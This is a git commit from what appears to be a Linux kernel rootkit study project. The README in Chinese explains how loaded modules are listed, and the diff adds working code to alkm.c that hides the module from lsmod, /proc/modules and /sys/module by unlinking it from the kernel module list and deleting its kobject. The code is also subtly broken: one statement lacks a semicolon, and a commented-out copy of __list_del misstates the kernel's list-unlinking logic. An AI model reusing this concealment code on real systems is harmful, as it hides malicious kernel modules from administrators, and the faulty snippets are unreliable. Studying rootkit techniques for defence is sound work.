e682b1c8cd29e14a466d9753c962050ab94ebdb4
a <>
2021-04-09 20:05:58 +0800

    hide from lsmod & /sys/module

--- README.md
+++ README.md
@@ -1,7 +1,7 @@
 # rootkit-A
 
 
-1. [基本模块](https://www.freebuf.com/articles/system/54263.html)
+### 1.1 [基本模块](https://www.freebuf.com/articles/system/54263.html)
 
 
 
@@ -16,4 +16,10 @@ cat /var/log/messages
 dmesg
 
 ```
+
+### 1.2 hide from lsmod & sysfs /proc/modules
+lsmod命令是通过/proc/modules来获取当前系统模块信息的。而/proc/modules中的当前系统模块信息是内核利用struct modules结构体的表头遍历内核模块链表、从所有模块的struct module结构体中获取模块的相关信息来得到的。结构体struct module在内核中代表一个内核模块。通过insmod(实际执行init_module系统调用)把自己编写的内核模块插入内核时，模块便与一个 struct module结构体相关联，并成为内核的一部分，所有的内核模块都被维护在一个全局链表中，链表头是一个全局变量struct module *modules。任何一个新创建的模块，都会被加入到这个链表的头部，通过modules->next即可引用到。为了让我们的模块在lsmod命令中的输出里消失掉，我们需要在这个链表内删除我们的模块
+
+### 1.3 从sysfs中隐藏模块
+
 
--- alkm.c
+++ alkm.c
@@ -16,13 +16,45 @@ static int alkm_init(void)
 {
     //指定消息优先级，输出到内核控制台/dmesg查看
     printk(KERN_ALERT "alkm: module loaded.\n");
+
+    printk(KERN_ALERT "alkm: hide from lsmod & /proc/modules.\n");
+    list_del_init(&__this_module.list);
+
+    printk("alkm: hide from /sys/module/.\n")
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+
     return 0;
 }
 
-static int alkm_exit(void)
+static void alkm_exit(void)
 {
     printk("alkm: module removed.\n");
 }
+
+//hide from lsmod & /proc/modules & /sys/module
+/*
+// list_del_init函数定义于include/linux/list.h中
+
+static inline void list_del_init(struct list_head * entry)
+{
+    // 连接 前一个和后一个的链表，bypass自身
+    __list_del(entry->prev, entry->next);
+    // 自身链接自身
+    INIT_LIST_HEAD(entry);
+};
+
+static inline void __list_del(struct list_head * prev, struct list_head * next)
+{
+    next->prev = prev;
+    next->next = next;
+};
+
+static inline void INIT_LIST_HEAD(struct list_head * list)
+{
+    list->next = list;
+    list->prev = list;
+};
+*/
 
 //内核宏-加载
 module_init(alkm_init);
